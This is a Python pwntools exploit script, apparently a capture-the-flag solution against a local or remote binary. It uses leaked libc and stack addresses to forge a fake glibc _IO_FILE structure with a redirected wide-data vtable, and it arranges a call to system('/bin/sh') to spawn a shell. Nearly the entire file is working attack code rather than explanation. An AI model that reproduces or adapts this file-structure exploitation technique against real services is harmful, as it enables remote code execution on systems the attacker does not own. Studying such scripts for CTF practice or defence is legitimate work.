#!/usr/bin/env python3
from pwn import *
import need

exe = ELF("./a.oute")
# context.log_level='debug'
libc = ELF("./libc.so.6")
ld = ELF("./ld.so")
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("addr", 1337)
else:
    p = process([exe.path])
    # input()
    gdb.attach(p, """

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
p.recvuntil("libc: ")
libcs = int(p.recvuntil(b"\n",drop=True),16)
libc.address = libcs - libc.sym['_IO_2_1_stdout_']
log.info(f"libc.adress: {hex(libc.address)}")
p.recvuntil(b"stack: ")
stack = int(p.recvuntil(b"\n",drop=True),16)
# vtable =0x404460
# log.info(f"vtable: {hex(vtable)}")
log.info(f"stack: {hex(stack)}")
###################################forging
context.clear(arch='amd64')
# some constants
stdout_lock = libc.sym["_IO_stdfile_1_lock"]	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
fake_vtable2 = libc.address + 0x1d3520
# our gadget
_IO_save_base = exe.sym.buff+72
gadget = libc.address +0x000000000014049c # add rdi, 0x10 ; jmp rcx
_IO_buf_end = exe.sym.buff+64
_lock = libc.sym['_IO_2_1_stdout_']+136
# fake = FileStructure(0)
# fake.flags = 0
# fake._IO_read_ptr = 0
# fake._IO_read_end = libc.sym.system
# fake._IO_save_base = 0
# fake._IO_buf_end = _IO_save_base
# fake._IO_save_end = u64(b"/bin/sh\0")
# fake._codecvt = _IO_buf_end
# fake._lock = exe.sym.buff+8   
# fake.fileno = gadget
# print(fake)
new = need._IO_FILE()
new._wide_data = exe.sym.buff+400
new._flags = 0x733b0810
new.hole1 = 0x68
new._lock = libc.sym._IO_stdfile_0_lock
new._unused2 = 0x6161616161616161616161616161616161616161
new.vtable = fake_vtable2-0x20
payload = new.create()+p64(u64(b"/bin/sh\0"))+b"the end of the forge"
payload += b"a"*(400-len(payload))+ p64(libc.sym.system)
payload += b"a"*(408-len(payload))+ b"b"*8
payload += b"a"*(424-len(payload))+ p64(0x20)
payload += b"a"*(432-len(payload))+ p64(0x30)
payload += b"a"*(448-len(payload))+ b"a"
payload += b"a"*(624-len(payload))+ p64(0x4041d8)
new.structure()
sa(b"there",payload)






p.interactive()
# good luck pwning :)

